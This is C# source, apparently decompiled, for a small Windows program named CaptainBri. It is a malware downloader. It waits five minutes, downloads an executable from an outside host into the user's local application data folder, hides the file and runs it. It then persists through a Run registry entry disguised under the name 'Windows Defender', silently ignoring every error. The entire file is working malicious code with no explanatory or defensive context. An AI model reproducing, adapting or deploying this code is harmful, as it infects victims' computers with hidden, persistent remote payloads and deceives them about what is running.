using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

namespace CaptainBri;

internal static class Program
{
	private static void Main()
	{
		try
		{
			Thread.Sleep(300000);
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\downloaded.exe";
			new WebClient().DownloadFile("http://endoftheinternet.fileave.com/BIN/SN/dllhost.exe", text);
			File.SetAttributes(text, FileAttributes.Hidden);
			Process.Start(text);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Defender", text);
		}
		catch
		{
		}
	}
}
